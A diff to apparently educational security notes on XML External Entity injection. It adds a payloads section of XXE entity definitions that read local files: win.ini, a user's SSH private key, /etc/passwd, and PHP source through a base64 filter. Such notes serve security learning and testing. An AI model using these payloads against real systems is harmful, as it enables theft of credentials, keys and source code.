@@ -1,4 +1,37 @@
 `XML External Entity (XXE) Injection` vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.
+
+## Payloads
+```windows
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ 
+    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> 
+]>
+<root>
+    <data>&xxe;</data>
+</root>
+```
+
+```
+<!DOCTYPE test [ 
+    <!ENTITY xxe SYSTEM "file:///c:/Users/daniel/.ssh/id_rsa"> 
+]>
+```
+
+```linux
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "file:///etc/passwd">
+]>
+<root>
+    <data>&company;</data>
+</root>
+```
+
+```
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+```
 ## XML
 `Extensible Markup Language (XML)` is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications.
 ## XML DTD
